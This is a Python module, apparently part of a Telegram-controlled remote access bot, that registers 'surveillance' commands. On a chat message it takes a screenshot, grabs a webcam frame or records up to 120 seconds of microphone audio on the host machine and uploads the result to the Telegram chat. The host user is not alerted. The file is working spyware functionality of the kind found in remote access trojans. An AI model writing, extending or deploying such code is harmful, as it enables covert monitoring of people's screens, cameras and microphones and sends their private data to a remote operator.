import os
import asyncio
import cv2
import pyautogui
import sounddevice as sd
from scipy.io.wavfile import write 
from telethon import events
from core.decorators import with_verify
from utils.helpers import safe_remove
from config import BASE_DIR

def register_surveillance(bot):
    @bot.on(events.NewMessage(func=lambda e: e.text == '📸 Скриншот'))
    @with_verify("Take Screenshot", dangerous=True)
    async def take_screen(event):
        screen_path = os.path.join(BASE_DIR, 's.png')
        pyautogui.screenshot(screen_path)
        await event.reply("📸 Снимок экрана:", file=screen_path)
        safe_remove(screen_path)

    @bot.on(events.NewMessage(func=lambda e: e.text == '🎥 Веб-камера'))
    @with_verify("Take WebCam Photo", dangerous=True)
    async def take_cam(event):
        cam_path = os.path.join(BASE_DIR, 'c.jpg')
        
        def _snap():
            cap = cv2.VideoCapture(0)
            try:
                for _ in range(5): cap.read()  # Прогрев камеры
                ret, frame = cap.read()
                if ret: 
                    cv2.imwrite(cam_path, frame)
                    return True
                return False
            finally:
                cap.release()

        # Теперь бот не зависнет, пока камера "думает"
        msg = await event.reply("⏳ Включаю камеру...")
        ok = await asyncio.to_thread(_snap)
        
        if ok: 
            await msg.delete()
            await event.reply("🎥 Кадр с веб-камеры:", file=cam_path)
        else:
            await msg.edit("❌ Ошибка камеры. Возможно, она отключена или занята другим приложением.")
        safe_remove(cam_path)

    @bot.on(events.NewMessage(func=lambda e: e.text == '🎤 Запись (10 сек)' or e.text.startswith('/mic')))
    @with_verify("Record Microphone", dangerous=True)
    async def record_mic(event):
        import re
        sec = 10
        m = re.match(r'^/mic(?: (\d+))?$', event.text)
        if m and m.group(1):
            sec = int(m.group(1))
        
        # Защита от OOM — максимум 120 секунд
        if sec > 120:
            return await event.reply("❌ Слишком долго. Максимальное время записи — 120 секунд.")
            
        msg = await event.reply(f"🎤 Записываю {sec} сек...")
        fp = os.path.join(BASE_DIR, 'mic.wav')
        
        def _rec():
            try:
                info = sd.query_devices(kind='input')
                rate = int(info['default_samplerate'])
                channels = min(2, info['max_input_channels'])
                rec = sd.rec(int(sec*rate), samplerate=rate, channels=channels, dtype='int16')
                sd.wait()
                write(fp, rate, rec)
                return True
            except Exception:
                return False
        
        ok = await asyncio.to_thread(_rec)
        if ok:
            await msg.delete()
            await event.reply("🎤 Запись готова:", file=fp)
            safe_remove(fp)
        else:
            await msg.edit("❌ Ошибка микрофона (отключен или нет прав в Windows)")